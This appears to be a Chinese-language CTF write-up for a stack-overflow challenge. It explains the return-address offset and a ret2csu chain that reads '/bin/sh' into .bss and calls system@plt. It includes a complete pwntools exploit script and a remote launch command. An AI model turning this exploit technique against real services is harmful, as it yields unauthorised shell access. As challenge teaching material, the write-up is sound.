# week30xPwn2

## 题目简述

程序在栈上声明 `char buf[0x49]`，却执行 `read(0, buf, 0x100)`，可以覆盖返回地址。NX 开启、程序未开启 PIE；二进制中已有 `read@got`、`system@plt`，但没有现成的 `/bin/sh` 字符串。

`func` 在溢出读取后把大部分通用寄存器清零，这不会阻止 ROP，因为返回后仍可通过 `__libc_csu_init` 的 gadgets 重新设置寄存器。

## 解题过程

以实际二进制进行 cyclic 定位，返回地址偏移为 `0x58`。源码数组大小是 `0x49`，编译器还会插入对齐和栈帧空间，因此不能直接把声明长度当成溢出偏移。

CSU 调用片段的核心行为为：

```asm
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword ptr [r15 + rbx * 8]
```

先通过 `0x401332` 处的连续 `pop` 设置：

- `rbx=0`、`rbp=1`，保证间接调用只执行一轮；
- `r12=0`、`r13=.bss`、`r14=8`，对应 `read(0, .bss, 8)`；
- `r15=read@got`，让间接调用落到 `read`。

调用结束会执行一次 `add rsp, 8` 和六次 `pop`，所以 ROP 链必须补七个占位 qword。随后使用 `0x40133b` 处从原指令中间切出的重叠 gadget `pop rdi; ret`，令 `rdi` 指向刚写入的 `/bin/sh`，再调用 `system@plt`。

```python
from pwn import ELF, args, context, flat, process, remote

context.binary = elf = ELF("./main", checksec=False)

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

offset = 0x58
csu_pop = 0x401332
csu_call = 0x401318
pop_rdi = 0x40133B
command = elf.bss() + 0x50

payload = b"A" * offset
payload += flat(
    csu_pop,
    0,                  # rbx
    1,                  # rbp
    0,                  # r12 -> edi
    command,            # r13 -> rsi
    8,                  # r14 -> rdx
    elf.got["read"],    # r15 -> [r15] = read
    csu_call,
    0, 0, 0, 0, 0, 0, 0,  # add rsp,8 与六次 pop
    pop_rdi,
    command,
    elf.plt["system"],
)

# func 中第一次 read 的上限是 0x100。整块发送可把后续 8 字节留给 ROP 中的 read。
payload = payload.ljust(0x100, b"\x00")
io.sendafter(b"Have A Good Time!", payload)
io.send(b"/bin/sh\x00")
io.interactive()
```

远程使用时传入当前实例，例如：

```text
python exp.py REMOTE HOST=example.com PORT=10010
```

## 方法总结

本题先用 ret2csu 构造 `read(0, .bss, 8)`，解决命令字符串缺失；再用二进制内的重叠 `pop rdi; ret` 设置首参数并调用 `system@plt`。偏移、CSU 清栈数量和两阶段输入边界都必须以实际二进制为准。
